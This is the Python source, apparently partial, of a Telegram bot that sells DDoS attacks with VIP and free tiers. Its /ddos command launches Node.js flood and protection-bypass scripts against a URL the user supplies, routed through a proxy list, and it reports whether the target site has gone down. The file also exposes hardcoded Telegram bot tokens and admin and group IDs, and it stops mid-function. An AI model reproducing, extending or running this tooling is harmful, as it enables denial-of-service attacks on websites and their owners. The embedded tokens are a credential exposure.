import logging, aiofiles, secrets, time, hashlib, datetime,subprocess, aiohttp
from typing import Set, Tuple
from typing import Tuple
from collections import Counter, defaultdict
import random, asyncio, os, sys
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    CallbackQueryHandler,
    CallbackContext,
    ContextTypes
)
from telegram.error import NetworkError, TelegramError, TimedOut , RetryAfter
import threading
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import json
import requests
import psutil
from functools import wraps, partial
from datetime import datetime, date
import pytz
import re
import ipaddress

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler("ddos.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Constants
TOKEN = '7175807614:AAEUtNjcRb72BJJL0hIsRGcVySYL8hfcS6E' #use 
# TOKEN = '7689457850:AAHYuqviFOIVGhgaBVXadDenURuoysBnSSU' #test 
ADMIN_IDS = [6464715777, 7371969470]  
admins = set(ADMIN_IDS) 
ALLOWED_GROUP_ID = -1002259079939 # usse
# ALLOWED_GROUP_ID = -1002371455370 # tess
MAX_RETRIES = 3
RETRY_DELAY = 5
STATUS_CHECK_COOLDOWN = 5
MAX_CHECK_ATTEMPTS = 5
monitoring_task = None
MONITOR_CHAT_ID = -1002313372403 # info cpu gpu
# MONITOR_CHAT_ID = -1002371455370 # info cpu gpu test

# Global variables
bot_active = True
status_check_counts = defaultdict(int)
status_check_cooldowns = {}
attack_processes = {}

# File paths
# attack_history_file = "attack_history.json"
# admin_file = "admin.txt"

# Timezone setup
vietnam_tz = pytz.timezone('Asia/Ho_Chi_Minh')
def get_vietnam_time():
    return datetime.now(vietnam_tz)

def TimeStamp():
    now = str(date.today())
    return now

# Initialize time variables
last_reset_time = datetime.now(vietnam_tz)
current_time = datetime.now(vietnam_tz)
start_time = datetime.now(vietnam_tz)

class ReloadOnChangeHandler(FileSystemEventHandler):
    def __init__(self, restart_callback):
        super().__init__()
        self.restart_callback = restart_callback

    def on_modified(self, event):
        if event.src_path.endswith(".py"):
            logger.info("Detected code change. Restarting bot...")
            self.restart_callback()

def restrict_room(func=None, *, ignore_restriction=False, enable_cooldown=False):
    if func is None:
        return partial(restrict_room, ignore_restriction=ignore_restriction, enable_cooldown=enable_cooldown)
        
    @wraps(func)
    async def wrapper(update: Update, context: CallbackContext):
        if update.message is None:
            return
            
        user_id = update.message.from_user.id
        chat_id = update.message.chat_id
        
        # Kiá»ƒm tra bot_active vÃ  user_id
        if not bot_active and user_id not in admins and func.__name__ != "bot_on":
            await update.message.reply_text("Bot hiá»‡n Ä‘ang táº¯t.")
            return

        # Kiá»ƒm tra CPU vÃ  RAM usage
        if func.__name__ == "ddos":  # Chá»‰ kiá»ƒm tra cho lá»‡nh ddos
            try:
                cpu_percent = psutil.cpu_percent(interval=1)
                memory = psutil.virtual_memory()
                memory_percent = memory.percent

                if cpu_percent >= 85 or memory_percent >= 85:
                    await update.message.reply_text(f'''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ âš ï¸ Cáº¢NH BÃO TÃ€I NGUYÃŠN
â•‘ â€¢ CPU: {cpu_percent}%
â•‘ â€¢ RAM: {memory_percent}%
â•‘ â€¢ Há»‡ thá»‘ng Ä‘ang quÃ¡ táº£i
â•‘ â€¢ Vui lÃ²ng thá»­ láº¡i sau
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''')
                    return
            except Exception as e:
                logger.error(f"Error checking system resources: {e}")
            
        if chat_id != ALLOWED_GROUP_ID and not ignore_restriction:
            return
            
        return await func(update, context)
            
    return wrapper

@restrict_room(ignore_restriction=True)  # Cho phÃ©p sá»­ dá»¥ng á»Ÿ má»i chat
async def bot_off(update: Update, context: CallbackContext):
    global bot_active
    user_id = update.message.from_user.id
    
    if not bot_active:
        await update.message.reply_text('Bot hiá»‡n Ä‘ang táº¯t.')
        return
        
    if user_id in admins:  # Sá»­a thÃ nh so sÃ¡nh báº±ng vÃ¬ ADMIN_ID lÃ  sá»‘
        bot_active = False
        await update.message.reply_text('Bot Ä‘Ã£ Ä‘Æ°á»£c táº¯t.')
    else:
        # await update.message.reply_text('Báº¡n khÃ´ng cÃ³ quyá»n thá»±c hiá»‡n thao tÃ¡c nÃ y.')
        pass

@restrict_room(ignore_restriction=True)  # Cho phÃ©p sá»­ dá»¥ng á»Ÿ má»i chat  
async def bot_on(update: Update, context: CallbackContext):
    global bot_active
    user_id = update.message.from_user.id
    
    if user_id in admins:  # Sá»­a thÃ nh so sÃ¡nh báº±ng vÃ¬ ADMIN_ID lÃ  sá»‘
        bot_active = True
        await update.message.reply_text('Bot Ä‘Ã£ Ä‘Æ°á»£c báº­t.')
    else:
        # await update.message.reply_text('Báº¡n khÃ´ng cÃ³ quyá»n thá»±c hiá»‡n thao tÃ¡c nÃ y.')
        pass
# END ADMIN CONMAND 

async def error_handler(update: object, context: CallbackContext) -> None:
    logger.error("Exception while handling an update:", exc_info=context.error)
    
    try:
        if isinstance(context.error, TimedOut):
            if update and update.effective_chat:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="âŒ› Timeout error. Retrying..."
                )
        elif isinstance(context.error, NetworkError):
            if update and update.effective_chat:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="ğŸŒ Network error. Retrying..."
                )
        else:
            if update and update.effective_chat:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"âŒ An error occurred: {str(context.error)}"
                )
            logger.error(f"Update {update} caused error {context.error}")
    except Exception as e:
        logger.error(f"Error in error handler: {e}", exc_info=True)

# SQl connect
import pytz
from datetime import date
import mysql.connector
from modules.database_connection import DatabaseConnection
def get_vietnam_time():
    tz = pytz.timezone('Asia/Ho_Chi_Minh')
    return datetime.now(tz)
def TimeStamp():
  now = str(date.today())
  return now
vietnam_tz = pytz.timezone('Asia/Ho_Chi_Minh')
last_reset_time = datetime.now(vietnam_tz)
current_time = datetime.now(vietnam_tz)
start_time = datetime.now(vietnam_tz)

db = DatabaseConnection.get_instance()
def load_users_from_mysql():
    try:
        db = DatabaseConnection.get_instance()
        query = "SELECT user_id, expiration_time, expiration_key_time, using_key FROM users"
        results = db.execute_query(query)
        
        if results is None:
            return set(), set(), {}
            
        vip_users = set()
        freeuser = set()
        vip_expiration = {}
        
        if results:
            for (user_id, expiration_time, expiration_key_time, using_key) in results:
                # Convert naive datetime to aware datetime with Vietnam timezone
                if expiration_time:
                    expiration_time = vietnam_tz.localize(expiration_time)
                if expiration_key_time:
                    expiration_key_time = vietnam_tz.localize(expiration_key_time)
                    
                current_time = datetime.now(vietnam_tz)
                
                if expiration_time and expiration_time > current_time:
                    vip_users.add(user_id)
                    vip_expiration[user_id] = expiration_time
                elif using_key and expiration_key_time and expiration_key_time > current_time:
                    freeuser.add(user_id)
        
        return vip_users, freeuser, vip_expiration
    except Exception as e:
        # Log error if needed
        return set(), set(), {}

vip_users, freeuser, vip_expiration = load_users_from_mysql() or (set(), set(), {})
# End SQl connect
# DDoS
user_cooldowns_ddos = {}
user_cooldowns_ddos_vip = {}
# Äá»‹nh nghÄ©a cÃ¡c cáº¥u hÃ¬nh cho VIP vÃ  FREE users
VIP_CONFIG = {
    'methods': ['FLOOD', 'BYPASS', 'FLOOD2', 'BYPASS2'],  # ThÃªm 2 phÆ°Æ¡ng thá»©c má»›i
    'time': 120,  # thá»i gian ddos vip
    'rate': 15,
    'threads': 10,
    'proxy': './modules/proxy.txt', 
    'cooldown': 150  # thá»i gian chá» vip
}
FREE_CONFIG = {
    'methods': ['FLOOD'],
    'time': 70,  # thá»i gian ddos free
    'rate': 8,
    'threads': 4,
    'proxy': './modules/proxy.txt',
    'cooldown': 120  # thá»i gian chá» free
}
# Dictionary lÆ°u thá»i gian cooldown cá»§a user
user_cooldowns = {}

def validate_url(url: str) -> Tuple[bool, str]:
    # Blacklist domains
    blacklist = [
        "bdu", "edu",  "chinhphu", "cloudflare", "gov", "google", 
        "facebook", "tiktok", "microsoft", "apple", "amazon", 
        "netflix", "twitter", "instagram", "github", "gitlab", 
        "heroku", "azure", "aws", "alibaba", "oracle", "ibm", 
        "cisco", "akamai", "youtube", "yahoo", "bing", "paypal", 
        "shopify", "wix", "squarespace", "digitalocean", "linode", 
        "vultr", "godaddy", "namecheap", "cloudways", "plesk", "cpanel"
    ]
    
    # Loáº¡i bá» khoáº£ng tráº¯ng
    url = url.strip().lower()  # Convert to lowercase for case-insensitive comparison
    
    # Kiá»ƒm tra Ä‘á»™ dÃ i URL
    if len(url) < 3 or len(url) > 2048:
        return False, "âŒ URL khÃ´ng há»£p lá»‡ (Ä‘á»™ dÃ i khÃ´ng phÃ¹ há»£p)"

    # ThÃªm schema náº¿u khÃ´ng cÃ³
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    try:
        # Parse URL Ä‘á»ƒ kiá»ƒm tra cÃ¡c thÃ nh pháº§n
        from urllib.parse import urlparse
        parsed = urlparse(url)
        
        # Kiá»ƒm tra hostname
        hostname = parsed.hostname
        if not hostname:
            return False, "âŒ URL khÃ´ng há»£p lá»‡ (khÃ´ng cÃ³ hostname)"

        # Kiá»ƒm tra IP address
        try:
            ipaddress.ip_address(hostname)
            return False, "âŒ KhÃ´ng há»— trá»£ táº¥n cÃ´ng IPv4/IPv6"
        except ValueError:
            pass

        # Kiá»ƒm tra blacklist
        for blocked in blacklist:
            if blocked in hostname:
                return False, f'''
âŒ Url bá»‹ cáº¥m
'''

        # Kiá»ƒm tra cÃ¡c kÃ½ tá»± khÃ´ng há»£p lá»‡ trong URL
        invalid_chars = set('<>"{}|\\^`')
        if any(char in url for char in invalid_chars):
            return False, "âŒ URL chá»©a kÃ½ tá»± khÃ´ng há»£p lá»‡"

        # Kiá»ƒm tra Ä‘á»™ dÃ i cá»§a tá»«ng pháº§n
        if len(hostname) > 253:  # Max length of domain name
            return False, "âŒ Domain quÃ¡ dÃ i"
        
        if parsed.path and len(parsed.path) > 1024:
            return False, "âŒ Path quÃ¡ dÃ i"

        # Kiá»ƒm tra TLD há»£p lá»‡ (Ã­t nháº¥t 2 kÃ½ tá»±)
        tld = hostname.split('.')[-1]
        if len(tld) < 2:
            return False, "âŒ TLD khÃ´ng há»£p lá»‡"

        return True, url

    except Exception as e:
        logger.error(f"URL validation error: {str(e)}")
        return False, "âŒ URL khÃ´ng há»£p lá»‡"

# Methods
@restrict_room(ignore_restriction=True)
async def methods(update: Update, context: CallbackContext):
    # Dictionary chá»©a mÃ´ táº£ cho tá»«ng phÆ°Æ¡ng thá»©c
    method_descriptions = {
        'FLOOD': 'Website khÃ´ng cÃ³ báº£o vá»‡',
        'BYPASS': 'CÃ³ kháº£ nÄƒng vÆ°á»£t 1 sá»‘ biá»‡n phÃ¡p báº£o vá»‡',
        'FLOOD2': 'Website khÃ´ng cÃ³ báº£o vá»‡',
        'BYPASS2': 'Kháº£ nÄƒng vÆ°á»£t qua báº£o vá»‡ hÃªn xu'
    }
    
    # Táº¡o danh sÃ¡ch phÆ°Æ¡ng thá»©c vá»›i mÃ´ táº£
    methods_list = '\n'.join(
        f'â€¢ <code>{method}</code>\n  â””â”€ {method_descriptions.get(method, "KhÃ´ng cÃ³ mÃ´ táº£")}'
        for method in VIP_CONFIG['methods']
    )
    
    message = f'''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ ğŸ“ PHÆ¯Æ NG THá»¨C Táº¤N CÃ”NG
{methods_list}
â•‘ ğŸ’¡ Sá»­ dá»¥ng vá»›i /ddos
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•'''
    
    await update.message.reply_text(message, parse_mode='HTML')
# End Methods

import shutil

def get_node_path():
    """Get the correct path to Node.js executable"""
    try:
        # Thá»­ láº¥y Ä‘Æ°á»ng dáº«n tá»« which
        node_path = subprocess.check_output(['which', 'node'], 
                                          universal_newlines=True).strip()
        if node_path:
            return node_path
    except:
        # CÃ¡c Ä‘Æ°á»ng dáº«n phá»• biáº¿n Ä‘á»ƒ tÃ¬m node
        possible_paths = [
            '/usr/bin/node',
            '/usr/local/bin/node',
            '/root/.nvm/versions/node/v22.11.0/bin/node',  # NVM path
            os.path.expanduser('~/.nvm/versions/node/v22.11.0/bin/node')
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                return path
                
    return None

# Láº¥y Ä‘Æ°á»ng dáº«n node má»™t láº§n khi khá»Ÿi Ä‘á»™ng
NODE_PATH = get_node_path()

active_attacks = {} 
@restrict_room
async def ddos(update: Update, context: CallbackContext):
    vip_users, freeuser, vip_expiration = load_users_from_mysql() or (set(), set(), {})
    try:
        user_id = update.message.from_user.id
        current_time = time.time()
        # Kiá»ƒm tra user type vÃ  admin
        is_admin = user_id in admins
        is_vip = user_id in vip_users
        is_free = user_id in freeuser
        if not NODE_PATH:
            await update.message.reply_text('''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ âŒ Lá»–I KHá»I Äá»˜NG
â•‘ â€¢ KhÃ´ng tÃ¬m tháº¥y Node.js
â•‘ â€¢ Vui lÃ²ng kiá»ƒm tra cÃ i Ä‘áº·t
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''')
            return
        if not is_admin and user_id in active_attacks: # bá» qua admin 
            attack_info = active_attacks[user_id]
            remaining_time = int(attack_info['end_time'] - current_time)
            
            if remaining_time > 0:
                await update.message.reply_text(f'''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ âš ï¸ Spam t kÃ­ch bÃ¢y giá»
â•‘ â€¢ Äang táº¥n cÃ´ng: <code>{attack_info['target']}</code>
â•‘ â€¢ Thá»i gian chá» cÃ²n láº¡i: {remaining_time} giÃ¢y
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''', parse_mode='HTML')
                return
            else:
                # Náº¿u thá»i gian Ä‘Ã£ háº¿t, xÃ³a thÃ´ng tin táº¥n cÃ´ng
                del active_attacks[user_id]

        if not (is_admin or is_vip or is_free):
            await update.message.reply_text('''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ â€¢ Mua VIP hoáº·c láº¥y KEY Ä‘á»ƒ /ddos
â•‘ â€¢ Láº¥y key: /laykey
â•‘ â€¢ XÃ¡c thá»±c key: /key + key Ä‘Ã£ láº¥y
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''')
            return

        # Thiáº¿t láº­p config dá»±a trÃªn loáº¡i user
        if is_admin:
            config = VIP_CONFIG.copy()
            config['cooldown'] = 0
            config['time'] = 200  
            config['rate'] = 15   
            config['threads'] = 10  
        elif is_vip:
            config = VIP_CONFIG.copy()
        else:
            config = FREE_CONFIG.copy()

        # Kiá»ƒm tra cooldown (bá» qua náº¿u lÃ  admin)
        if not is_admin:
            last_used = user_cooldowns.get(user_id, 0)
            if current_time - last_used < config['cooldown']:
                remaining = int(config['cooldown'] - (current_time - last_used))
                await update.message.reply_text(f'''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ â³ VUI LÃ’NG Äá»¢I
â•‘ â€¢ CÃ²n {remaining}s Ä‘á»ƒ gá»i lá»‡nh /ddos
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''')
                return

        args = context.args
        if len(args) < 1:
            await update.message.reply_text('''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ ğŸ“ HÆ¯á»šNG DáºªN ADMIN DDOS
â•‘ â–¶ CÃ¡ch 1:
â•‘ â€¢ /ddos + methods + url + time
â•‘ â€¢ VD: /ddos FLOOD example.com 300
â•‘ â–¶ CÃ¡ch 2:
â•‘ â€¢ /ddos + url + time
â•‘ â€¢ VD: /ddos example.com 300
â•‘ â–¶ PhÆ°Æ¡ng thá»©c:
â•‘ â€¢ FLOOD: Táº¥n cÃ´ng thÆ°á»ng
â•‘ â€¢ BYPASS: Táº¥n cÃ´ng bypass
â•‘ â€¢ FLOOD2: Táº¥n cÃ´ng non-protection
â•‘ â€¢ BYPASS2: Táº¥n cÃ´ng try-protection
â•‘ ğŸ’¡ /methods: Ä‘á»ƒ xem phÆ°Æ¡ng thá»©c
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''')
            return
        elif is_vip:
            if len(args) < 1:
                await update.message.reply_text(f'''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ ğŸ“ DDOS VIP USER
â•‘ â–¶ CÃ¡ch 1:
â•‘ â€¢ /ddos + url
â•‘ â€¢ VD: /ddos example.com
â•‘ â–¶ CÃ¡ch 2:
â•‘ â€¢ /ddos + phÆ°Æ¡ng thá»©c + url
â•‘ â€¢ VD: /ddos BYPASS example.com
â•‘ â–¶ PhÆ°Æ¡ng thá»©c:
â•‘ â€¢ FLOOD: Táº¥n cÃ´ng thÆ°á»ng
â•‘ â€¢ BYPASS: Táº¥n cÃ´ng bypass
â•‘ â€¢ FLOOD2: Táº¥n cÃ´ng non-protection
â•‘ â€¢ BYPASS2: Táº¥n cÃ´ng try-protection
â•‘ â–¶ ThÃ´ng tin:
â•‘ â€¢ Thá»i gian: {config['time']}s
â•‘ â€¢ Cooldown: {config['cooldown']}s
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''')
                return
        else:  # FREE user
            if len(args) < 1:
                await update.message.reply_text(f'''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ ğŸ“ DDOS FREE USER
â•‘ â€¢ /ddos + url
â•‘ â€¢ VD: /ddos example.com
â•‘ â–¶ ThÃ´ng tin:
â•‘ â€¢ Thá»i gian: {config['time']}s
â•‘ â€¢ Cooldown: {config['cooldown']}s
â•‘ â€¢ Chá»‰ há»— trá»£: FLOOD
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''')
                return

        # Xá»­ lÃ½ arguments dá»±a trÃªn loáº¡i user
        if is_admin:
            if args[0].upper() in config['methods']:
                method = args[0].upper()
                url = args[1] if len(args) > 1 else None
                attack_time = int(args[2]) if len(args) > 2 and args[2].isdigit() else config['time']
            else:
                method = 'FLOOD'  # Default method
                url = args[0]
                attack_time = int(args[1]) if len(args) > 1 and args[1].isdigit() else config['time']
        elif is_vip:
            if args[0].upper() in config['methods']:
                method = args[0].upper()
                url = args[1] if len(args) > 1 else None
            else:
                method = 'FLOOD'
                url = args[0]
            attack_time = config['time']
        else:  # FREE user
            # LuÃ´n sá»­ dá»¥ng method FLOOD vÃ  láº¥y URL tá»« argument cuá»‘i cÃ¹ng
            method = 'FLOOD'
            url = args[-1]  # Láº¥y argument cuá»‘i cÃ¹ng lÃ m URL
            attack_time = config['time']

        if url is None:
            await update.message.reply_text('Sá»­ dá»¥ng /ddos Ä‘á»ƒ xem hÆ°á»›ng dáº«n')
            return
        # Validate URL
        is_valid, result = validate_url(url)
        if not is_valid:
            await update.message.reply_text(result)
            return
        url = result  # Use validated and formatted URL

        # Láº¥y cÃ¡c thÃ´ng sá»‘ tá»« config
        rate = config['rate']
        threads = config['threads']
        proxy = config['proxy']

        max_time = 200 # Ä‘áº£m báº£o khÃ´ng vÆ°á»£t quÃ¡ thá»i gian. Náº¿u vÆ°á»£t -> 200 ( max tine ddos)
        if attack_time > max_time:
            attack_time = max_time
        try:
            if not is_admin:
                active_attacks[user_id] = {
                    'end_time': current_time + attack_time,
                    'target': url
                }
            if method == 'FLOOD2':
                try:
                    process = subprocess.Popen([
                        # 'node',
                        NODE_PATH, 
                        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'modules/non-protection.js'),
                        url,                             # target (process.argv[2])
                        str(min(attack_time, max_time)), # time (process.argv[3])
                        str(rate),                       # Rate (process.argv[4])
                        str(threads),                    # threads (process.argv[5])
                        proxy                            # proxyFile (process.argv[6])
                    ])
                    attack_processes[update.message.chat_id] = process
                except Exception as e:
                    logger.error(f"Error starting FLOOD2 attack: {e}")
                    await update.message.reply_text("âŒ KhÃ´ng thá»ƒ khá»Ÿi Ä‘á»™ng FLOOD2")
                    return
            elif method == 'BYPASS2':
                try:
                    process = subprocess.Popen([
                        # 'node',
                        NODE_PATH, 
                        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'modules/try-protection.js'),
                        'GET',
                        str(min(attack_time, max_time)), 
                        str(threads),
                        proxy,
                        str(rate),
                        url
                    ])
                    attack_processes[update.message.chat_id] = process
                except Exception as e:
                    logger.error(f"Error starting BYPASS2 attack: {e}")
                    await update.message.reply_text("âŒ KhÃ´ng thá»ƒ khá»Ÿi Ä‘á»™ng BYPASS2")
                    return
            elif method == 'BYPASS':
                try:
                    process = subprocess.Popen([
                    # 'node',
                    NODE_PATH, 
                    '--max-old-space-size=4096',
                    os.path.join(os.path.dirname(os.path.abspath(__file__)), 'modules/two-methods.js'),
                    url,
                    str(min(attack_time, max_time)), 
                    str(rate),
                    str(threads),
                    proxy,
                    method
                    ])
                    attack_processes[update.message.chat_id] = process
                except Exception as e:
                    logger.error(f"Error starting BYPASS2 attack: {e}")
                    await update.message.reply_text("âŒ KhÃ´ng thá»ƒ khá»Ÿi Ä‘á»™ng BYPASS2")
                    return
            else:
                process = subprocess.Popen([
                    # 'node',
                    NODE_PATH,
                    '--max-old-space-size=4096',
                    os.path.join(os.path.dirname(os.path.abspath(__file__)), 'modules/two-methods.js'),
                    url,
                    str(min(attack_time, max_time)), 
                    str(rate),
                    str(threads),
                    proxy,
                    method
            ])
            attack_processes[update.message.chat_id] = process
            
        except Exception as e:
            logger.error(f"Error starting attack process: {e}")
            await update.message.reply_text('''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ âŒ Lá»–I KHá»I Äá»˜NG
â•‘ â€¢ KhÃ´ng thá»ƒ báº¯t Ä‘áº§u táº¥n cÃ´ng
â•‘ â€¢ Vui lÃ²ng thá»­ láº¡i sau
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''')
            return

        # Cáº­p nháº­t cooldown
        user_cooldowns[user_id] = current_time

        # Create keyboard
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("ğŸ” Check host", url=f"https://check-host.net/check-http?host={url}"),
                InlineKeyboardButton("ğŸ“Š Kiá»ƒm tra nhanh", callback_data=f"st_{url}")
            ]
        ])

        # XÃ¡c Ä‘á»‹nh user type cho tin nháº¯n
        if is_admin:
            user_type = "ADMIN"
        elif is_vip:
            user_type = "VIP"
        else:
            user_type = "FREE"

        attack_msg = await update.message.reply_text(
            f'''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ ğŸš€ Báº¯t Ä‘áº§u táº¥n cÃ´ng [{user_type}]
â•‘ â€¢ Website: <code>{url}</code>
â•‘ â€¢ Thá»i gian: {attack_time}s
â•‘ â€¢ Request/s: {rate}
â•‘ â€¢ Luá»“ng: {threads}
â•‘ â€¢ PhÆ°Æ¡ng thá»©c: {method}
â•‘ â€¢ Sá»­ dá»¥ng láº¡i trong: {config['cooldown']} giÃ¢y
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''',
            reply_markup=keyboard,
            parse_mode='HTML'
        )

        async def end_attack():
            try:
                await asyncio.sleep(attack_time)
                
    
                if process.poll() is None:  
                    process.terminate()
                    try:
                        process.wait(timeout=5) 
                    except subprocess.TimeoutExpired:
                        process.kill()  
                
                attack_processes.pop(update.message.chat_id, None)
                
                try:
                    await attack_msg.edit_text(
                        f'''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ ğŸ›‘ Dá»«ng táº¥n cÃ´ng
â•‘ â€¢ Website: <code>{url}</code>
â•‘ â€¢ Thá»i gian: {attack_time}s
â•‘ â€¢ PhÆ°Æ¡ng thá»©c: {method}
â•‘ â€¢ Tráº¡ng thÃ¡i: HoÃ n thÃ nh
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''',
                        parse_mode='HTML'
                    )
                except Exception as e:
                    logger.error(f"Error updating end message: {e}")
                    
            except Exception as e:
                logger.error(f"Error in end_attack: {e}")

        asyncio.create_task(end_attack())
        
    except Exception as e:
        logger.error(f"Error in ddos command: {e}")
        await update.message.reply_text(f"âŒ")

async def handle_status_check(update: Update, context: CallbackContext):
    query = update.callback_query
    try:
        message_id = f"{query.message.chat.id}_{query.message.message_id}"
        user_id = query.from_user.id
        current_time = time.time()
        
        url = query.message.text.split('Website: ')[1].split('\n')[0].strip()
        if url.startswith('<code>'):
            url = url[6:-7]
            
        status_check_counts[message_id] += 1
        
        if status_check_counts[message_id] > MAX_CHECK_ATTEMPTS:
            await query.message.delete()
            await query.answer(
                "âŒ Max check attempts exceeded",
                show_alert=True
            )
            return
            
        last_check = status_check_cooldowns.get(user_id, 0)
        if current_time - last_check < STATUS_CHECK_COOLDOWN:
            remaining = round(STATUS_CHECK_COOLDOWN - (current_time - last_check))
            remaining_checks = MAX_CHECK_ATTEMPTS - status_check_counts[message_id]
            await query.answer(
                f"â³ Äá»£i {remaining}s Ä‘á»ƒ kiá»ƒm tra láº¡i\n"
                f"ğŸ“Š {remaining_checks} lÆ°á»£t kiá»ƒm tra",
                show_alert=True
            )
            return
            
        status_check_cooldowns[user_id] = current_time
        
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("ğŸ” Kiá»ƒm tra Website", url=f"https://check-host.net/check-http?host={url}"),
                InlineKeyboardButton("â³ Äang xá»­ lÃ½", callback_data="cooldown")
            ]
        ])

        remaining_checks = MAX_CHECK_ATTEMPTS - status_check_counts[message_id]
        await query.message.edit_text(
            f'''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ â³ ÄANG KIá»‚M TRA WEBSITE
â•‘ â€¢ Website: <code>{url}</code>
â•‘ â€¢ {remaining_checks} lÆ°á»£t kiá»ƒm tra
â•‘ âš ï¸ Vui lÃ²ng Ä‘á»£i...
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''',
            reply_markup=keyboard,
            parse_mode='HTML'
        )
        try:
            response = await asyncio.wait_for(
                asyncio.get_event_loop().run_in_executor(
                    None, 
                    lambda: requests.get(url, timeout=10)
                ),
                timeout=10
            )
            
            status_code = response.status_code
            if status_code == 200:
                status = "ğŸŸ¢ Sá»‘ng"
            elif status_code >= 500:
                status = "ğŸ”´ Cháº¿t"  
            else:
                status = f"ğŸŸ¡ Pháº£n há»“i: {status_code}"
                
        except (requests.Timeout, asyncio.TimeoutError):
            status = "ğŸ”´ TIMEOUT HOáº¶C Cháº¿t"
            response = None
            
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("ğŸ” Check host", url=f"https://check-host.net/check-http?host={url}"),
                InlineKeyboardButton("ğŸ“Š Kiá»ƒm tra nhanh", callback_data=f"st_{url}")
            ]
        ])
        
        response_time = response.elapsed.total_seconds() if response else 10
        await query.message.edit_text(
            f'''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ ğŸ“Š TRáº NG THÃI WEBSITE
â•‘ â–¶ ThÃ´ng tin:
â•‘ â€¢ Website: <code>{url}</code>
â•‘ â€¢ Tráº¡ng thÃ¡i: {status}
â•‘ â€¢ Thá»i gian pháº£n há»“i: {response_time:.2f} giÃ¢y
â•‘ â€¢ Kiá»ƒm tra láº¡i: {STATUS_CHECK_COOLDOWN} giÃ¢y
â•‘ â€¢ {remaining_checks} lÆ°á»£t kiá»ƒm tra
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''',
            reply_markup=keyboard,
            parse_mode='HTML'
        )
            
    except Exception as e:
        logger.error(f"Error checking status: {e}")

async def cleanup_attacks():
    """Clean up all running attack processes"""
    for chat_id, process in attack_processes.items():
        try:
            if process.poll() is None:
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()
        except Exception as e:
            logger.error(f"Error cleaning up process for chat {chat_id}: {e}")
    attack_processes.clear()

# Start Proxy
from datetime import datetime, timedelta
import asyncio
# CÃ¡c biáº¿n global Ä‘á»ƒ kiá»ƒm soÃ¡t
last_proxy_update = 0
PROXY_UPDATE_INTERVAL = 1800  
MAX_UPDATE_TIME = 1740  
proxy_update_lock = asyncio.Lock()
is_updating = False  
is_proxy_update_running = False
is_proxy_update_running = False
proxy_cron_task = None
async def check_proxy(proxy, timeout=5):
